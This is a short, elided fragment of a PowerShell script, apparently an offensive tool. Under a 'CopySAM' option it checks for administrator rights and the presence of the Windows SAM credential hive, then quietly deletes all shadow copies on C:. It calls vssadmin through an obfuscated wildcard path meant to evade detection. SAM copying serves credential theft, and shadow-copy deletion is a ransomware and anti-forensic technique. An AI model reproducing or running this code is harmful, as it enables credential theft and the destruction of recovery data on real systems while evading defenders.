...
"@
	...
	elseif ($CopySAM -and $Dest) {
		...
		if ($([bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) -and $(Test-Path "C:\windows\system32\config\SAM")) {
			...
			# delete shadow copy
			(C:\??*?\*3?\v?*a?mi?.?x? delete shadows /For=C: /quiet)
		}
